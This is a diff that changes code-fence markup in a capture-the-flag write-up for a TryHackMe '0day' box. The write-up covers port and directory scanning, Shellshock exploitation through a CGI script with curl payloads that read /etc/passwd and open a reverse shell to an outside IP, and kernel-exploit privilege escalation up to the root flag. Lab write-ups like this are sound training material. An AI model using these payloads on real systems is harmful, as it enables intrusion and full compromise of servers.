@@ -6,7 +6,7 @@ Note: -Exploit Ubuntu, like a Turtle in a Hurricane
 
 Reconnaissance:
 + Scan <IP> available ports and enumurate the directories:
-'''bash
+```bash
 	nmap -sV -vv -A -T4 -p- <IP>
 	PORT   STATE SERVICE REASON         VERSION
 	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
@@ -24,9 +24,9 @@ Reconnaissance:
 	| http-methods: 
 	|_  Supported Methods: GET HEAD POST OPTIONS
 	|_http-server-header: Apache/2.4.7 (Ubuntu)
-'''
+```
 
-'''bash
+```bash
 	gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -xtxt -t64
 	===============================================================
 	Gobuster v3.6
@@ -67,13 +67,13 @@ Reconnaissance:
 	Finished
 	===============================================================
 
-'''
+```
 + Afer check all around the available directories we just know /backup with key ssh but still stuck.
 + The first time we see /cgi-bin, we are not interested about it but research and know maybe that have the vulnerable in this directory /cgi-bin. 
 + Research and know that we can use tool call "nikto" to scan this vulnerable.
 + Let's try it:
 
-'''bash
+```bash
 ./nikto.pl -h <IP>
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
@@ -104,13 +104,13 @@ Reconnaissance:
 + End Time:           2024-09-26 22:21:09 (GMT7) (-23254 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-'''
+```
 => Great! We found it the vulnerable /cgi-bin/test.cgi. That is the vulnerable name as "CVE-2014-6271"
 + Let try to exploit it
 + Link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi"
 + Link: "https://github.com/opsxcq/exploit-CVE-2014-6271"
 + First we can try command to read file /etc/passwd:
-'''bash
+```bash
 	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://<IP>/cgi-bin/test.cgi
 	root:x:0:0:root:/root:/bin/bash
 	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -135,13 +135,13 @@ Reconnaissance:
 	messagebus:x:102:105::/var/run/dbus:/bin/false
 	ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
 	sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
-'''
+```
 -> It works so now we can put reverse shell through /cgi-bin/test.cgi to RCE.
-'''bash
+```bash
 	curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.101.46/1234 0>&1' http://<IP>/cgi-bin/test.cgi
-'''
+```
 + Open the listener open 
-'''bash
+```bash
 	zicco@z-a:~/Documents/CTFs/0day$ nc -lvnp 1234
 	Listening on 0.0.0.0 1234
 	Connection received on 10.10.201.210 49682
@@ -160,11 +160,11 @@ Reconnaissance:
 	nc -lvnp 1234
 	             id
 	uid=33(www-data) gid=33(www-data) groups=33(www-data)
-'''
+```
 + We use tool "linpeas.sh" scan and find the vector PE. That is kernel "linux 3.13.0-32-generic"
 + Research and find the file compile to PE.
 + Link: "https://www.exploit-db.com/exploits/37292"
-'''bash
+```bash
 	www-data@ubuntu:/$ cd /
 	www-data@ubuntu:/$ ls
 	bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
@@ -233,7 +233,7 @@ www-data@ubuntu:/tmp$ echo $PATH
 	root.txt
 	# cat root.txt	
 	THM{g00d_j0b_0day_is_Pleased}
-'''
+```
 
 
 
